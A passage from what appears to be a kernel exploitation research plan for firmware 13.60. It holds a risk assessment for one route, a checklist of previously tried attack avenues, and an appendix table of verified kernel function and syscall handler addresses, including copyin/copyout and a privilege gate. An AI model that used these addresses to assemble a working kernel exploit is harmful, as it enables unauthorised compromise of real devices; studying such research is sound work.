       worth having, because the contents are hardware state.
    3. 0x8b5da3e0 must not be a panic. If it is KASSERT and the condition is ever
       false, calling 623 is fatal; use a throwaway session.

(f) DEATH RISK
Medium-low. Two gates and a copyout are safe; the unknown 0x8b5da3e0 call is the
only risk and it runs on the success path only, so a gate failure keeps us safe.

===============================================================================
WHAT THIS DOCUMENT DOES NOT RE-PROPOSE
===============================================================================
Checked against the closed list, one line each:
  W^X / executable memory        - no route needs an executable mapping.
  CPL3 / KPTI                    - all routes stay in ring 3 and never touch CR3.
  aio 661-670, osem 549-556, umtx 454 - not referenced.
  credential bits                - R5 is a policy byte, not a credential.
  copy helper family             - none of the 15 is used as a primitive.
  copyout class (4,274 edges)    - R4/R10 do not dispute the edges; they question
                                   what the callers pass as length/aliasing.
  dynamic-length copies          - R7 is about argument slots, not lengths.
  mdbg 601, 638/639, 597 bit     - not referenced; R5 explicitly contrasts with it.
  YMM0 clobber                   - R9 is rsp and AC, not the vector file.
  Spectre v1 / Zenbleed / PMC / Ryzen cache - none.
  cdevsw enumeration             - not referenced.

===============================================================================
APPENDIX: VERIFIED ADDRESS TABLE (13.60, base 0xffffffff8a9c0000)
===============================================================================
  copyin                0x8ac19280   rdi=user, rsi=kern, rdx=len
  copyout               0x8ac191d0   rdi=kern, rsi=user, rdx=len
  memcpy                0x8ac190b0
  vm_map_lock           0x8ac86820
  vm_map_lookup         0x8ac86c40
  PTE fetch (547 path)  0x8b47a710
  page-table walker     0x8f1480     (only caller 0x3eecf5, pmap = vmspace+0x2e8)
  privilege/id gate     0x8ad833e0   (edi=id, rsi=proc) -> nonzero = allowed
  thread lookup         0x8b552420   (edi=tid, esi=pid)
  malloc / free         0x8b4eac60 / 0x8b4e4250
  mtx_lock_flags        0x8ae878b0
  setter of proc+0xc81  0x38f7bf     mov byte [rax+0xc81], cl
  trap entry stubs      0x2551d8..0x2578f8, stride 0x1d0, 24 of them
  context restore       0x252300..0x252340
  syscall 379 handler   0xabbd80
  syscall 547 handler   0xaba540
  syscall 572 handler   0xabac50
  syscall 623 handler   0x8d25a0
  syscall 632 handler   0x438e30
  syscall 634 handler   0x439150
  syscall 659 handler   0x34b7b0 (real body), 0x34b790 (thunk)
